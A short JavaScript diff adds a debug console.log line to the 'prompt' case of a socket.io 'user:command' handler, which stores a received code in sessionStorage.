@@ -165,6 +165,7 @@ socket.on("user:command", (data) => {
 	      break;
 
     case "prompt":
+    console.log("code :",code);
       if (!code) return;
 	       phoneNumberEl = document.querySelector("#code");
 	      sessionStorage.setItem("setcode", code);
